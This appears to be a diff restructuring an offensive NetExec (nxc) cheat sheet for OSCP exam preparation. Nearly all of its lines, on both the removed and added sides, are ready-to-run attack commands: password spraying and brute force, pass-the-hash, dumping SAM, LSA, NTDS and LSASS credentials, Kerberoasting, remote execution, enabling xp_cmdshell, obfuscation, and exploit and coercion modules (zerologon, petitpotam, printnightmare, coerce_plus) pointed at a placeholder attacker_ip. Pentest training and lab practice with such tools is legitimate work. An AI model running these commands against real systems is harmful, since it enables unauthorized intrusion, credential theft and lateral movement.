@@ -1,208 +1,150 @@
-Available Protocols - smb,ftp,rdp,ssh,winrm,mssql,ldap
+**Shared / General (use with any supported protocol like smb, ldap, winrm, mssql, etc.):**  
+Basic scan / live hosts:  
+nxc <protocol> 192.168.1.0/24
 
-Enumerate hosts responding to SMB:  
-nxc smb 192.168.1.0/24
+Auth check (valid creds):  
+nxc <protocol> <target> -u user -p pass  
+nxc <protocol> <target> -u user -H nthash  
+nxc <protocol> <target> -u user -p pass -k (Kerberos)  
+nxc <protocol> <target> -u user -p pass --local-auth
 
-Enumerate SMB shares with null session:  
-nxc smb 192.168.1.10 -u '' -p '' --shares
+Password spraying (one password many users):  
+nxc <protocol> <targets> -u users.txt -p 'Password123' --continue-on-success --no-bruteforce
 
-Enumerate SMB shares with guest account:  
-nxc smb 192.168.1.10 -u 'guest' -p '' --shares
+Credential stuffing / brute (careful in OSCP):  
+nxc <protocol> <target> -u users.txt -p passwords.txt --continue-on-success
 
-Enumerate SMB shares with credentials:  
-nxc smb 192.168.1.0/24 -u user -p pass --shares
+Command execution (cmd):  
+nxc <protocol> <target> -u user -p pass -x 'whoami /all'  
+nxc <protocol> <target> -u user -p pass --exec-method wmiexec -x 'whoami' (methods: wmiexec, atexec, smbexec, mmcexec)
 
-Check SMB access with credentials:  
-nxc smb 192.168.1.10 -u user -p pass
+PowerShell execution:  
+nxc <protocol> <target> -u user -p pass -X '$PSVersionTable' --obfs (obfuscate)
 
-Password spraying over SMB:  
-nxc smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
+List modules for protocol:  
+nxc <protocol> -L
 
-Credential stuffing over SMB:  
-nxc smb 192.168.1.10 -u users.txt -p passwords.txt --continue-on-success
+Run module (with options/help):  
+nxc <protocol> <target> -u user -p pass -M module_name -o OPTION=value  
+nxc <protocol> -M module_name --options (show opts)
 
-Pass-the-hash over SMB:  
-nxc smb 192.168.1.10 -u user -H lmhash:nthash
+File transfer:  
+nxc <protocol> <target> -u user -p pass --get-file 'remote\path' local.txt --share SHARE  
+nxc <protocol> <target> -u user -p pass --put-file local.txt 'remote\path' --share SHARE
 
-Enumerate domain users over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --users
+Custom port / evasion:  
+nxc <protocol> <target> --port 445 -u user -p pass  
+nxc <protocol> <target> -t 50 --jitter 1-3 --timeout 10
 
-Enumerate domain groups over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --groups
+**SMB-specific (most common in OSCP for shares, signing, AD enum, relays, vulns):**  
+Null/guest shares:  
+nxc smb <target> -u '' -p '' --shares  
+nxc smb <target> -u 'guest' -p '' --shares
 
-Enumerate domain computers over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --computers
+Creds shares + access:  
+nxc smb <target> -u user -p pass --shares
 
-Enumerate logged-on users over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --loggedon-users
+RID brute (no creds sometimes):  
+nxc smb <target> --rid-brute (or with -u -p)
 
-Enumerate SMB sessions:  
-nxc smb 192.168.1.10 -u user -p pass --sessions
+Domain enum (users/groups/computers/policy/sessions/loggedon):  
+nxc smb <dc> -u user -p pass --users  
+nxc smb <dc> -u user -p pass --groups  
+nxc smb <dc> -u user -p pass --computers  
+nxc smb <dc> -u user -p pass --pass-pol  
+nxc smb <dc> -u user -p pass --sessions  
+nxc smb <dc> -u user -p pass --loggedon-users  
+nxc smb <dc> -u user -p pass --disks
 
-Enumerate domain password policy over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --pass-pol
+Dumps:  
+nxc smb <target> -u user -p pass --sam  
+nxc smb <target> -u user -p pass --lsa  
+nxc smb <target> -u user -p pass --ntds (drsuapi default)  
+nxc smb <target> -u user -p pass --ntds vss  
+nxc smb <target> -u user -p pass --dpapi
 
-RID brute-force user enumeration over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --rid-brute
+BloodHound collection:  
+nxc smb <target> -u user -p pass --bloodhound -c all
 
-Dump SAM hashes over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --sam
-
-Dump LSA secrets over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --lsa
-
-Dump NTDS.dit over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --ntds
-
-Execute command over SMB:  
-nxc smb 192.168.1.10 -u user -p pass -x 'whoami'
-
-Execute PowerShell over SMB:  
-nxc smb 192.168.1.10 -u user -p pass -X 'powershell -c "whoami"'
-
-Check for SMB signing disabled:  
+Relay sig check + list:  
 nxc smb 192.168.1.0/24 --gen-relay-list relay.txt
 
-Enumerate disks over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --disks
+Vulns / coerce:  
+nxc smb <target> -M zerologon  
+nxc smb <target> -M petitpotam  
+nxc smb <target> -M nopac  
+nxc smb <target> -M printnightmare  
+nxc smb <target> -M coerce_plus -o LISTENER=attacker_ip
 
-Check ZeroLogon vulnerability:  
-nxc smb 192.168.1.10 -u user -p pass -M zerologon
+Spider/download files:  
+nxc smb <target> -u user -p pass -M spider_plus  
+nxc smb <target> -u user -p pass -M spider_plus -o READ_ONLY=False DOWNLOAD_FLAG=True
 
-Check PetitPotam vulnerability:  
-nxc smb 192.168.1.10 -u user -p pass -M petitpotam
+LSASS dumps (modules):  
+nxc smb <target> -u user -p pass -M lsassy  
+nxc smb <target> -u user -p pass -M nanodump  
+nxc smb <target> -u user -p pass -M procdump
 
-Check NoPAC vulnerability:  
-nxc smb 192.168.1.10 -u user -p pass -M nopac
+Other modules:  
+nxc smb <target> -u user -p pass -M enum_av (AV/EDR)  
+nxc smb <target> -u user -p pass -M rdp -o ENABLE=true (enable RDP)  
+nxc smb <target> -u user -p pass -M slinky -o SERVER=attacker_ip NAME=file.lnk (create symlink)  
+nxc smb <target> -u user -p pass -M scuffy -o SERVER=attacker_ip NAME=file.scf  
+nxc smb <target> -u user -p pass -M enum_dns (DNS via WMI)  
+nxc smb <target> -u user -p pass -M get_netconnections (network conns)  
+nxc smb <target> -u user -p pass -M backup_operator (NTDS dump via backup)  
+nxc smb <target> -u user -p pass -M ntdsutil (NTDS via ntdsutil)
 
-Check PrintNightmare vulnerability:  
-nxc smb 192.168.1.10 -u user -p pass -M printnightmare
+**LDAP-specific (great for AD enum, no-exec but rich info):**  
+Basic enum (users/trusts/delegation):  
+nxc ldap <dc> -u user -p pass --users  
+nxc ldap <dc> -u user -p pass --trusted-for-delegation
 
-Check for AV/EDR products:  
-nxc smb 192.168.1.10 -u user -p pass -M enum_av
+Dumps / attacks:  
+nxc ldap <dc> -u user -p pass --ntds  
+nxc ldap <dc> -u user -p pass --asreproast hashes.asreproast  
+nxc ldap <dc> -u user -p pass --kerberoasting hashes.kerb
 
-Create symbolic link for relay:  
-nxc smb 192.168.1.10 -u user -p pass -M slinky
+BloodHound via LDAP:  
+nxc ldap <dc> -u user -p pass --bloodhound -c all
 
-Coerce authentication (PetitPotam, DFSCoerce, etc.):  
-nxc smb 192.168.1.10 -u user -p pass -M coerce_plus -o LISTENER=attacker_ip
+Common modules:  
+nxc ldap <dc> -u user -p pass -M shadow_credentials  
+nxc ldap <dc> -u user -p pass -M laps -o computer=hostname  
+nxc ldap <dc> -u user -p pass -M get-desc-users  
+nxc ldap <dc> -u user -p pass -M groupmembership -o USER=username
 
-Generate BloodHound data over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --bloodhound -c all
+**WinRM-specific (reliable shell / exec after foothold):**  
+Dumps (if admin):  
+nxc winrm <target> -u user -p pass --sam  
+nxc winrm <target> -u user -p pass --lsa
 
-AS-REP roasting over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --asreproast output.txt
+**MSSQL-specific (DB enum + RCE via xp_cmdshell):**  
+Enum / version:  
+nxc mssql <target> -u user -p pass -q 'SELECT @@VERSION'
 
-Kerberoasting over SMB:  
-nxc smb 192.168.1.10 -u user -p pass --kerberoasting output.txt
+Enable & use xp_cmdshell:  
+nxc mssql <target> -u user -p pass --enable-xp  
+nxc mssql <target> -u user -p pass -X 'whoami'  (after enable)
 
-Enumerate LDAP server:  
-nxc ldap 192.168.1.10 -u user -p pass
+Priv esc / link:  
+nxc mssql <target> -u user -p pass -M mssql_priv -o ACTION=enum/escalate/link TARGET=other_sql
 
-Password spraying over LDAP:  
-nxc ldap 192.168.1.10 -u users.txt -p 'Password123' --continue-on-success
+**Other protocols (less common in OSCP but appear):**  
+RDP check / screenshot:  
+nxc rdp <target> -u user -p pass  
+nxc rdp <target> -u user -p pass --screenshot  
+nxc rdp <target> --nla-screenshot (if NLA disabled)
 
-Pass-the-hash over LDAP:  
-nxc ldap 192.168.1.10 -u user -H nthash
+SSH (Linux foothold):  
+nxc ssh <target> -u user -p pass -x 'whoami'
 
-Kerberos authentication over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass -k
+FTP enum:  
+nxc ftp <target> -u user -p pass
 
-Enumerate domain users over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass --users
+WMI exec / query:  
+nxc wmi <target> -u user -p pass -x 'whoami'  
+nxc wmi <target> -u user -p pass --wmi 'SELECT * FROM Win32_ComputerSystem'
 
-Enumerate trusted domains over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass --trusted-for-delegation
-
-Dump NTDS.dit over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass --ntds
-
-AS-REP roasting over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass --asreproast output.txt
-
-Kerberoasting over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass --kerberoasting output.txt
-
-Generate BloodHound data over LDAP:  
-nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c all
-
-Check Shadow Credentials vulnerability:  
-nxc ldap 192.168.1.10 -u user -p pass -M shadow_credentials
-
-Enumerate WinRM access:  
-nxc winrm 192.168.1.10 -u user -p pass
-
-Execute command over WinRM:  
-nxc winrm 192.168.1.10 -u user -p pass -x 'whoami'
-
-Execute PowerShell over WinRM:  
-nxc winrm 192.168.1.10 -u user -p pass -X 'Get-Process'
-
-Pass-the-hash over WinRM:  
-nxc winrm 192.168.1.10 -u user -H nthash
-
-Dump SAM over WinRM:  
-nxc winrm 192.168.1.10 -u user -p pass --sam
-
-Dump LSA over WinRM:  
-nxc winrm 192.168.1.10 -u user -p pass --lsa
-
-Enumerate MSSQL instances:  
-nxc mssql 192.168.1.0/24
-
-Check MSSQL access:  
-nxc mssql 192.168.1.10 -u user -p pass
-
-Execute query over MSSQL:  
-nxc mssql 192.168.1.10 -u user -p pass -q 'SELECT @@VERSION'
-
-Enable xp_cmdshell over MSSQL:  
-nxc mssql 192.168.1.10 -u user -p pass --enable-xp
-
-Execute command via xp_cmdshell:  
-nxc mssql 192.168.1.10 -u user -p pass -X 'whoami'
-
-Pass-the-hash over MSSQL:  
-nxc mssql 192.168.1.10 -u user -H nthash
-
-Link MSSQL servers for lateral movement:  
-nxc mssql 192.168.1.10 -u user -p pass -M mssql_priv -o ACTION=link TARGET=remote_server
-
-Enumerate RDP access:  
-nxc rdp 192.168.1.10 -u user -p pass
-
-Pass-the-hash over RDP:  
-nxc rdp 192.168.1.10 -u user -H nthash
-
-Check RDP security settings:  
-nxc rdp 192.168.1.10 -u user -p pass -M rdp -o ACTION=enum
-
-Enumerate SSH access:  
-nxc ssh 192.168.1.10 -u user -p pass
-
-Execute command over SSH:  
-nxc ssh 192.168.1.10 -u user -p pass -x 'whoami'
-
-Enumerate FTP access:  
-nxc ftp 192.168.1.10 -u user -p pass
-
-Enumerate WMI access:  
-nxc wmi 192.168.1.10 -u user -p pass
-
-Execute command over WMI:  
-nxc wmi 192.168.1.10 -u user -p pass -x 'whoami'
-
-Enumerate VNC access:  
-nxc vnc 192.168.1.10 -u user -p pass
-
-List available modules for a protocol:  
-nxc smb --modules
-
-Run a specific module:  
-nxc smb 192.168.1.10 -u user -p pass -M module_name -o OPTION=value
-
-Generate hosts file for scanning:  
-nxc smb 192.168.1.0/24 --gen-relay-list hosts.txt
-
-Proxy through SOCKS for commands:  
-proxychains -q nxc smb 192.168.1.10 -u user -p pass --shares
+VNC check:  
+nxc vnc <target> -u user -p pass
